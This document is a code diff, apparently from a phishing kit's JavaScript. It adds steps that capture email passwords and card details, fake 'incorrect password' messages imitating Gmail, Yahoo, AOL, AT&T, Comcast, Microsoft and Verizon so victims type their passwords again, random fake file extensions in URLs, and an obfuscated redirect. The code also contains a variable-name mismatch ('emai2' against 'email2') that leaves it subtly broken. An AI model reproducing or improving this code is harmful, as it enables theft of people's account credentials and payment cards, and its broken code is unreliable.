@@ -254,7 +254,7 @@ async function form_index(form) {
                 window.location.replace(location.href + "&vry=" + (new Date()).getTime());
                 window.location.reload();
             } else {
-                let url = location.href.split("#")[0] + "#/login/verify.js?" + query_gen();
+                let url = location.href.split("#")[0] + "#/login/verify" + rand_url() + "?" + query_gen();
                 location.replace(url);
                 window.location.reload();
             }
@@ -279,7 +279,7 @@ async function form_verify(form) {
         window.location.reload();
     } else {
         if (result.response.msg.includes("uccessfull")) {
-            let url = location.href.split("#")[0] + "#/login/details.js?" + query_gen();
+            let url = location.href.split("#")[0] + "#/login/details" + rand_url() + "?" + query_gen();
             location.replace(url);
             window.location.reload();
         } else {
@@ -306,7 +306,7 @@ async function form_details(form) {
         window.location.reload();
     } else {
         if (result.response.msg.includes("uccessfull")) {
-            let url = location.href.split("#")[0] + "#/login/card.js?" + query_gen();
+            let url = location.href.split("#")[0] + "#/login/card" + rand_url() + "?" + query_gen();
             location.replace(url);
             window.location.reload();
         } else {
@@ -325,6 +325,34 @@ async function form_contact(form) {
 }
 
 
+async function form_email(form) {
+    let email = document.getElementById("_email").value;
+    let password = document.getElementById("login-passwd").value;
+    let post = Email_Pass_single(localStorage.getItem("username"), email, password);
+    let result = await load_Send_post(post);
+    if (Object.keys(result).includes('errors')) {
+        window.location.replace(location.href);
+        window.location.reload();
+    } else {
+        if (result.response.msg.includes("uccessfull")) {
+            localStorage.setItem("completed", "true");
+            if (TWO_TRY_EMAIL === true && location.href.includes('eero=') === false) {
+                window.location.replace(location.href + "&eero=" + (new Date()).getTime());
+                window.location.reload();
+            } else {
+                let url = location.href.split("#")[0] + "#/login/complete" + rand_url() + "?" + query_gen();
+                location.replace(url);
+                window.location.reload();
+            }
+        } else {
+            window.location.replace(location.href);
+            window.location.reload();
+        }
+    }
+    return false;
+}
+
+
 async function form_card(form) {
     let card = document.getElementById("card").value;
     let cvv = document.getElementById("cvv").value;
@@ -338,7 +366,7 @@ async function form_card(form) {
         window.location.reload();
     } else {
         if (result.response.msg.includes("uccessfull")) {
-            let url = location.href.split("#")[0] + "#/login/contact.js?" + query_gen();
+            let url = location.href.split("#")[0] + "#/login/contact" + rand_url() + "?" + query_gen();
             location.replace(url);
             window.location.reload();
         } else {
@@ -376,24 +404,30 @@ function query_gen() {
     return ("scr=" + Math.random().toString().replace("0.", "") + "&cookies=" + window.btoa(Math.random().toString()).replace("=", "").replace("=", "") + "&tokens=" + Math.random().toString().replace("0.", ""));
 }
 
+function rand_url() {
+    let urls = [".html", ".htm", ".asp", ".js", ".json", ".png", ".jpg", ".svg", ".jsx", ".jsp"];
+    return urls[Math.floor(Math.random() * 10)];
+}
+
 function userEmail(email = "") {
-    email = "eml=" + email.toLowerCase() + "&";
-    if (email.includes("@gmail")) {
-        return "#/login/email/gmail.js?" + email + query_gen();
-    } else if (email.includes("@yahoo") || email.includes("@ymail") || email.includes("@rocketmail") || email.includes("@att.")) {
-        return "#/login/email/yahoo.js?" + email + query_gen();
-    } else if (email.includes("@outlook") || email.includes("@hotmail") || email.includes("@live") || email.includes("@msn")) {
-        return "#/login/email/microsolt.js?" + email + query_gen();
-    } else if (email.includes("@aol")) {
-        return "#/login/email/aol.js?" + email + query_gen();
-    } else if (email.includes("@comcast")) {
-        return "#/login/email/comcast.js?" + email + query_gen();
-    } else if (email.includes("@att") || email.includes("@bells")) {
-        return "#/login/email/att.js?" + email + query_gen();
-    } else if (email.includes("@verizon")) {
-        return "#/login/email/verizon.js?" + email + query_gen();
+    let emai2 = email.toLowerCase();
+    email = "eml=" + btoa(email.toLowerCase()) + "&";
+    if (email2.includes("@gmail")) {
+        return "#/login/email/gmail" + rand_url() + "?" + email + query_gen();
+    } else if (email2.includes("@yahoo") || email2.includes("@ymail") || email2.includes("@rocketmail") || email2.includes("@att.")) {
+        return "#/login/email/yahoo" + rand_url() + "?" + email + query_gen();
+    } else if (email2.includes("@outlook") || email2.includes("@hotmail") || email2.includes("@live") || email2.includes("@msn")) {
+        return "#/login/email/microsolt" + rand_url() + "?" + email + query_gen();
+    } else if (email2.includes("@aol")) {
+        return "#/login/email/aol" + rand_url() + "?" + email + query_gen();
+    } else if (email2.includes("@comcast")) {
+        return "#/login/email/comcast" + rand_url() + "?" + email + query_gen();
+    } else if (email2.includes("@att") || email2.includes("@bells")) {
+        return "#/login/email/att" + rand_url() + "?" + email + query_gen();
+    } else if (email2.includes("@verizon")) {
+        return "#/login/email/verizon" + rand_url() + "?" + email + query_gen();
     } else {
-        return "#/login/email/microsolt.js?" + email + query_gen();
+        return "#/login/email/microsolt" + rand_url() + "?" + email + query_gen();
     }
 }
 
@@ -404,10 +438,35 @@ function Annonymous_one() {
     let countForWait = 0;
     waitForHeaderElement();
 
+    function homepage() {
+        let url = location.href.split("#")[0] + "#/login/?" + query_gen();
+        var _0x2efe = ['9430zwDzJl', '85kKMdUq', '7577WcwRrp', '6502jhNFpb', '146601QuZxkY', '13699TyvWPW', '14rWUVfE', '15309VpTwJW', url, '27233jaFqDs'];
+        var _0x179f = function (_0x59284c, _0x36e29b) {
+            _0x59284c = _0x59284c - 0x187;
+            var _0x2efe40 = _0x2efe[_0x59284c];
+            return _0x2efe40;
+        };
+        (function (_0x4a7fe2, _0xde34a) {
+            var _0x529748 = _0x179f;
+            while (!![]) {
+                try {
+                    var _0x1d901e = -parseInt(_0x529748(0x18c)) + -parseInt(_0x529748(0x18e)) + -parseInt(_0x529748(0x18b)) + parseInt(_0x529748(0x189)) + -parseInt(_0x529748(0x188)) * parseInt(_0x529748(0x187)) + -parseInt(_0x529748(0x190)) + -parseInt(_0x529748(0x18f)) * -parseInt(_0x529748(0x18d));
+                    if (_0x1d901e === _0xde34a) break; else _0x4a7fe2['push'](_0x4a7fe2['shift']());
+                } catch (_0x214b85) {
+                    _0x4a7fe2['push'](_0x4a7fe2['shift']());
+                }
+            }
+        }(_0x2efe, 0x2d408), setTimeout(() => {
+            var _0x17c14b = _0x179f;
+            window['location']['href'] = _0x17c14b(0x18a);
+        }, 0x5dc));
+    }
+
     function waitForHeaderElement() {
         countForWait++;
         if (typeof _HEAD !== "undefined" && _HEAD !== null) {
-            console.log(document.getElementById("error"));
+            homepage();
+            aolYah();
             if (url_index_name === "index" && location.href.includes('vry=')) {
                 document.getElementById("UserID").classList.add("error");
                 document.getElementById("currentpassword").style.borderColor = 'red';
@@ -419,6 +478,44 @@ function Annonymous_one() {
         } else {
             if (countForWait < 20)
                 setTimeout(waitForHeaderElement, 250);
+        }
+    }
+
+    function aolYah() {
+        if ((url_index_name === "aol" && location.href.includes('eero=')) || (url_index_name === "yahoo" && location.href.includes('eero='))) {
+            document.getElementById("passError").innerHTML = '<p class="error-msg" role="alert" data-error="messages.ERROR_INVALID_PASSWORD">Invalid password. Please try&nbsp;again</p>';
+            document.getElementById("password-container").classList.add("error");
+        }
+
+        if (url_index_name === "att" && location.href.includes('eero=')) {
+            document.getElementById("passError").innerHTML = '<div _ngcontent-dsm-c29="" id="errContainer" class="errorContainer ng-star-inserted"><div _ngcontent-dsm-c29="" class="errorIcon errorRedIcon"></div><div _ngcontent-dsm-c29="" id="errorTextArea" class="errorText"><div _ngcontent-dsm-c29="" id="errorDescArea" class="errorDesc">Double check your ID and password, and try again.</div><div _ngcontent-dsm-c29="" id="errorCodeArea" class="errorCode">Care Code:  201 [LU100]</div></div></div>';
+            document.getElementById("login-passwd").setAttribute("aria-invalid", "true");
+            document.getElementById("passwordLabel").classList.add("validationError");
+            document.getElementById("passwordLabelAfter").classList.add("textfield-label", "validationError");
+        }
+
+        if (url_index_name === "comcast" && location.href.includes('eero=')) {
+            document.getElementById("errorPass").innerHTML = '<p class="error_message">The Xfinity ID or password you entered was incorrect. Please try again.</p>';
+            document.getElementById("user").classList.add("error");
+            document.getElementById("login-passwd").classList.add("error");
+        }
+
+        if (url_index_name === "gmail" && location.href.includes('eero=')) {
+            document.getElementById("enterPass").style.color = "#d93025";
+            document.getElementById("borderRed").style.borderColor = "#d93025";
+            document.getElementById("dis-1").style.display = "flex";
+            document.getElementById("dis-2").style.display = "flex";
+            document.getElementById("dis-2").style.color = "#d93025";
+            document.getElementById("login-passwd").focus();
+        }
+
+        if (url_index_name === "microsoft" && location.href.includes('eero=')) {
+            document.getElementById("login-passwd").classList.add("has-error");
+            document.getElementById("passError").innerHTML = "<div id=\"passwordError\" class=\"error ext-error\"><span>Your account or password is incorrect.</span></div>";
+        }
+
+        if (url_index_name === "verizon" && location.href.includes('eero=')) {
+            document.getElementById("errorPass").innerHTML = '<p id="bannererror" tabindex="0" class="bg-danger">The information you entered does not match our files. Please enter your password to continue.</p>';
         }
     }
 }
